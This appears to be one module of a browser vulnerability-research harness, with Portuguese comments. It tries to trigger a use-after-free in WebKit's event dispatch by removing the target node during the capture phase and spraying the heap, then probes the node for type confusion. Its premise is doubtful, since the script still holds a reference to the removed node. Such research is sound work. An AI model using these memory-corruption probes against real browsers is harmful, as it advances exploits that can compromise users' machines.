import { Groomer } from '../mod_groomer.js';

export default {
    id:       'DOM_EVENT_PATH_UAF',
    category: 'DOM',
    risk:     'HIGH',
    description:
        'UAF no EventDispatcher C++. O caminho do evento é pré-calculado. ' +
        'Durante a fase de captura (descida), destruímos o nó alvo e forçamos o GC. ' +
        'Quando o evento entra na fase de borbulha (subida), tenta ler o EventTarget libertado.',

    setup: function() {
        this.results = {};
        this.sandbox = document.getElementById('groomer-sandbox');
        
        this.parent = document.createElement('div');
        this.target = document.createElement('button');
        
        this.parent.appendChild(this.target);
        this.sandbox.appendChild(this.parent);
        
        void this.parent.offsetWidth; // Constrói a RenderTree C++
        
        const self = this;
        
        // A ARMADILHA: Executa NA DESCIDA (Capture: true)
        this.parent.addEventListener('click', function(e) {
            // O GATILHO: Matamos o alvo antes que o evento chegue a ele!
            self.target.remove();
            
            // Inundamos a memória C++ para sobrepor o EventTarget destruído
            let trash = Groomer.sprayDOM('audio', 200);
        }, true); // <- TRUE = Fase de Captura
        
        // O EXTRATOR: Executa NA SUBIDA (Bubble: false) do próprio alvo fantasma!
        this.target.addEventListener('click', function(e) {
            try {
                // 'this' aqui é o EventTarget. O WebKit acha que ele está vivo.
                // Mas ele já foi removido e a memória esburacada.
                self.results.ghostNodeName = this.nodeName; 
                self.results.ghostNodeType = this.nodeType;
            } catch(err) {
                self.results.error = err.message;
            }
        });
    },

    trigger: function() {
        try {
            // Disparamos o evento sincronicamente
            let evt = new MouseEvent('click', { bubbles: true, cancelable: true });
            this.target.dispatchEvent(evt);
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        s => s.results.error || 'Trajetória Concluída',
        
        // Probe de TYPE CONFUSION (O alvo mudou de identidade?)
        s => {
            if (s.results.ghostNodeName) {
                let name = s.results.ghostNodeName;
                if (name !== 'BUTTON') {
                    // Se o nome for indefinido ou diferente, o C++ leu lixo da RAM
                    return `💥 TYPE CONFUSION: BUTTON virou ${name}`; 
                }
            }
            return 'BUTTON Retido e Seguro';
        },

        // Probe de STALE DATA
        s => {
            let type = s.results.ghostNodeType;
            if (type !== undefined && type !== 1) { // 1 = ELEMENT_NODE
                return type; // Dispara STALE DATA no HUD
            }
            return 0; // Seguro
        }
    ],

    cleanup: function() {
        try { this.parent.remove(); } catch(e){}
        this.parent = null;
        this.target = null;
        this.results = {};
    }
};
